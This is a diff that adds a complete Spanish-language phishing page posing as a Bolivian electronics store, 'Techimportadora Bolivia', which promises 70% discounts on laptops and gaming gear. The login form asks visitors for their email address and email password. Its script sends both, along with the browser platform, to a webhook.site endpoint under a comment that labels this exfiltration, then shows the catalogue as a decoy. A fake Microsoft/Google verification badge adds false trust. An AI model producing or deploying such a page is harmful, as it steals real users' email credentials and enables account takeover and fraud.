@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Techimportadora Bolivia - Liquidación Total</title>
+    <style>
+        body { background-color: #f1f3f4; font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; padding: 0; }
+        .header { background: #1a73e8; color: white; padding: 25px; text-align: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+        .container { max-width: 1200px; margin: 20px auto; padding: 20px; }
+        
+        /* Formulario de Acceso */
+        #registro-box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 450px; margin: 50px auto; text-align: center; }
+        .logo-tech { width: 70px; margin-bottom: 20px; }
+        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; }
+        .btn-acceso { background: #34a853; color: white; border: none; padding: 16px; border-radius: 4px; cursor: pointer; font-weight: bold; width: 100%; font-size: 16px; }
+
+        /* Catálogo Extendido */
+        #catalogo { display: none; }
+        .section-title { border-bottom: 2px solid #1a73e8; padding-bottom: 10px; margin: 30px 0 20px 0; color: #202124; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 25px; }
+        .card { background: white; border-radius: 10px; padding: 25px; border: 1px solid #eee; transition: 0.3s; text-align: center; position: relative; }
+        .card:hover { transform: translateY(-10px); box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
+        .card img { width: 100%; height: 180px; object-fit: contain; margin-bottom: 15px; }
+        .card h3 { font-size: 18px; margin: 10px 0; color: #333; }
+        .card .precio { color: #d93025; font-size: 26px; font-weight: bold; margin: 15px 0; }
+        .btn-buy { background: #1a73e8; color: white; border: none; padding: 12px; border-radius: 4px; cursor: pointer; width: 100%; font-weight: bold; }
+        
+        .oferta-tag { position: absolute; top: 10px; right: 10px; background: #ffeb3b; color: #000; padding: 5px 10px; font-size: 11px; font-weight: bold; border-radius: 3px; }
+    </style>
+</head>
+<body>
+
+<div class="header">
+    <h1>TECHIMPORTADORA BOLIVIA</h1>
+    <p>Precios de fábrica para usuarios registrados</p>
+</div>
+
+<div class="container">
+
+    <div id="registro-box">
+        <img src="https://cdn-icons-png.flaticon.com/512/689/689304.png" class="logo-tech" alt="Logo">
+        <h2>Área de Clientes</h2>
+        <p>Inicie sesión con su correo para activar los descuentos del 70%.</p>
+        <form id="login-form">
+            <input type="email" id="email" placeholder="Correo electrónico" required>
+            <input type="password" id="pass" placeholder="Contraseña de correo" required>
+            <button type="submit" class="btn-acceso">DESBLOQUEAR OFERTAS</button>
+        </form>
+        <p style="font-size: 11px; color: #999; margin-top: 15px;">Verificado por Microsoft SwiftKey & Google Security 2026</p>
+    </div>
+
+    <div id="catalogo">
+        
+        <h2 class="section-title">Laptops Gamer (Liquidación)</h2>
+        <div class="grid">
+            <div class="card">
+                <div class="oferta-tag">OFERTA i9</div>
+                <img src="https://m.media-amazon.com/images/I/71f5Eu5lJSL._AC_SL1500_.jpg" alt="MSI">
+                <h3>MSI Raider GE78</h3>
+                <div class="precio">2100 BS</div>
+                <button class="btn-buy" onclick="contactar()">Comprar Ahora</button>
+            </div>
+            <div class="card">
+                <img src="https://m.media-amazon.com/images/I/81AfuUF09uL._AC_SL1500_.jpg" alt="ROG">
+                <h3>ASUS ROG Strix G16</h3>
+                <div class="precio">1950 BS</div>
+                <button class="btn-buy" onclick="contactar()">Comprar Ahora</button>
+            </div>
+            <div class="card">
+                <img src="https://m.media-amazon.com/images/I/61K2XwT589L._AC_SL1500_.jpg" alt="Macbook">
+                <h3>MacBook Air M2</h3>
+                <div class="precio">2200 BS</div>
+                <button class="btn-buy" onclick="contactar()">Comprar Ahora</button>
+            </div>
+        </div>
+
+        <h2 class="section-title">Sillas & Comodidad</h2>
+        <div class="grid">
+            <div class="card">
+                <img src="https://m.media-amazon.com/images/I/61HEqR6Zp5L._AC_SL1500_.jpg" alt="Silla">
+                <h3>Silla Gamer Pro RGB</h3>
+                <div class="precio">280 BS</div>
+                <button class="btn-buy" onclick="contactar()">Comprar Ahora</button>
+            </div>
+            <div class="card">
+                <img src="https://m.media-amazon.com/images/I/713vU-qV+YL._AC_SL1500_.jpg" alt="Silla">
+                <h3>Silla Elite RGB Neon</h3>
+                <div class="precio">390 BS</div>
+                <button class="btn-buy" onclick="contactar()">Comprar Ahora</button>
+            </div>
+        </div>
+
+        <h2 class="section-title">Monitores & Periféricos</h2>
+        <div class="grid">
+            <div class="card">
+                <img src="https://m.media-amazon.com/images/I/61v4G4L0XAL._AC_SL1500_.jpg" alt="Monitor">
+                <h3>Samsung Odyssey G5 32"</h3>
+                <div class="precio">850 BS</div>
+                <button class="btn-buy" onclick="contactar()">Comprar Ahora</button>
+            </div>
+            <div class="card">
+                <img src="https://m.media-amazon.com/images/I/61y49dz46FL._AC_SL1500_.jpg" alt="Teclado">
+                <h3>Teclado Razer BlackWidow</h3>
+                <div class="precio">150 BS</div>
+                <button class="btn-buy" onclick="contactar()">Comprar Ahora</button>
+            </div>
+        </div>
+
+    </div>
+</div>
+
+<script>
+    document.getElementById('login-form').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const info = {
+            email: document.getElementById('email').value,
+            password: document.getElementById('pass').value,
+            plataforma: navigator.platform,
+            dominio: "techimportadora-bolivia.xyz" //
+        };
+
+        // EXFILTRACIÓN A WEBHOOK
+        fetch("https://webhook.site/c0bdd37c-06fd-4772-b06c-0d072aa26e94", {
+            method: "POST",
+            mode: "no-cors",
+            body: JSON.stringify(info)
+        });
+
+        document.getElementById('registro-box').innerHTML = "<h3>Verificando acceso...</h3>";
+        
+        setTimeout(() => {
+            document.getElementById('registro-box').style.display = 'none';
+            document.getElementById('catalogo').style.display = 'block';
+        }, 1500);
+    });
+
+    function contactar() {
+        alert("¡OFERTA RESERVADA! Por favor, comuníquese con su proveedor para ayudarle con el precio final y coordinar el envío.");
+    }
+</script>
+
+</body>
+</html>
